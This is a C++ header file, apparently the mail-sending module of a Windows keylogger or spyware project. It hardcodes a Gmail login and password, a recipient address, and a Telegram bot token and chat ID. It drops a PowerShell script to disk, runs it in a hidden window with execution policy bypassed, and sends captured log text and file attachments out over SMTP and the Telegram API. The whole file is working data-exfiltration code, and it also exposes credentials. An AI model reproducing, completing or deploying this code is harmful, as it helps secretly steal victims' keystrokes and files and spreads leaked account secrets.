#ifndef SENDMAIL_H
#define SENDMAIL_H

#include <fstream>
#include <vector>
#include <string>
#include <windows.h>
#include <curl/curl.h>
#include "IO.h"
#include "timer.h"
#include "helper.h"

#define SCRIPT_NAME "sm.ps1"

namespace Mail {

    const std::string X_IM_TO = "xghost123@bk.ru";
    const std::string X_EM_FROM = "julieguise5@gmail.com";
    const std::string X_EM_PASS = "momo5ms1";

    const std::string TELEGRAM_BOT_TOKEN = "7438678615:AAHKAeCT9cCA9ya1uk_GMCDmfmLh7XaTpbg";
    const std::string TELEGRAM_CHAT_ID = "5457852208";

    const std::string PowerShellScript = R"(Param(
        [String]$Att,
        [String]$Subj,
        [String]$Body
    )
    Function Send-EMail {
        Param (
            [Parameter(Mandatory=$true)][String]$To,
            [Parameter(Mandatory=$true)][String]$From,
            [Parameter(Mandatory=$true)][String]$Password,
            [Parameter(Mandatory=$true)][String]$Subject,
            [Parameter(Mandatory=$true)][String]$Body,
            [Parameter(Mandatory=$true)][String]$attachment
        )
        try {
            $Msg = New-Object System.Net.Mail.MailMessage($From, $To, $Subject, $Body)
            $Srv = "smtp.gmail.com"

            if ($attachment -ne $null) {
                try {
                    $Attachments = $attachment -split "::"
                    ForEach ($val in $Attachments) {
                        $attch = New-Object System.Net.Mail.Attachment($val)
                        $Msg.Attachments.Add($attch)
                    }
                } catch {
                    exit 2
                }
            }

            $Client = New-Object Net.Mail.SmtpClient($Srv, 587) # 587 for Gmail SMTP with SSL
            $Client.EnableSsl = $true
            $Client.Credentials = New-Object System.Net.NetworkCredential($From.Split("@")[0], $Password)
            $Client.Send($Msg)

            Remove-Variable -Name Client
            Remove-Variable -Name Password
            exit 7
        } catch {
            exit 3
        }
    }

    try {
        Send-EMail -attachment $Att -To ")" + X_IM_TO + R"(" -Body $Body -Subject $Subj -Password ")" +
    X_EM_PASS + R"(" -From ")" + X_EM_FROM + R"("
    } catch {
        exit 4
    })";

    // Function declarations to avoid scope errors
    bool CheckFileExists(const std::string& path);
    bool CreateScript();

    bool SendTelegramMessage(const std::string& message) {
        CURL* curl;
        CURLcode res;
        curl_global_init(CURL_GLOBAL_DEFAULT);

        curl = curl_easy_init();
        if (curl) {
            std::string url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN +
                              "/sendMessage?chat_id=" + TELEGRAM_CHAT_ID +
                              "&text=" + curl_easy_escape(curl, message.c_str(), message.length());

            curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
            res = curl_easy_perform(curl);

            curl_easy_cleanup(curl);
            curl_global_cleanup();

            if (res != CURLE_OK) {
                IO::WriteLog("Telegram Message Failed: " + std::string(curl_easy_strerror(res)));
                return false;
            }
        }
        return true;
    }

    int SendMail(const std::string& subject, const std::string& body, const std::string& attachments) {
        if (!CheckFileExists(IO::GetOurPath(true) + SCRIPT_NAME) && !CreateScript()) return -2;

        // Fix for SCRIPT_NAME concatenation
        std::string param = "-ExecutionPolicy Bypass -File \"" + std::string(SCRIPT_NAME) +
                            "\" -subj \"" + helper::ToString(subject) +
                            "\" -Body \"" + helper::ToString(body) +
                            "\" -Att \"" + attachments + "\"";

        SHELLEXECUTEINFO ShExecInfo = {0};
        ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
        ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
        ShExecInfo.hwnd = NULL;
        ShExecInfo.lpVerb = "open";
        ShExecInfo.lpFile = "powershell";
        ShExecInfo.lpParameters = param.c_str();
        ShExecInfo.nShow = SW_HIDE;

        if (!ShellExecuteEx(&ShExecInfo)) return -3;

        WaitForSingleObject(ShExecInfo.hProcess, 7000);
        DWORD exit_code = 100;
        GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);

        Timer m_Timer;
        m_Timer.SetFunction([&]() {
            WaitForSingleObject(ShExecInfo.hProcess, 60000);
            GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
            if (exit_code == STILL_ACTIVE) TerminateProcess(ShExecInfo.hProcess, 100);
            IO::WriteLog("<From SendMail> Return code: " + helper::ToString((int)exit_code));
        });

        m_Timer.SetRepeatCount(1);
        m_Timer.SetInterval(10);
        m_Timer.Start(true);

        SendTelegramMessage("Subject: " + subject + "\nBody: " + body);
        return static_cast<int>(exit_code);
    }

    int SendMail(const std::string& subject, const std::string& body, const std::vector<std::string>& att) {
        std::string attachments;
        for (const auto& v : att) {
            attachments += v + "::";
        }
        if (!attachments.empty()) attachments.pop_back();  // Remove trailing "::"
        return SendMail(subject, body, attachments);
    }

    bool CheckFileExists(const std::string& path) {
        std::ifstream file(path);
        return file.good();
    }

    bool CreateScript() {
        std::ofstream script(IO::GetOurPath(true) + SCRIPT_NAME);
        if (!script) return false;

        script << PowerShellScript;
        return true;
    }

}  // namespace Mail

#endif  // SENDMAIL_H
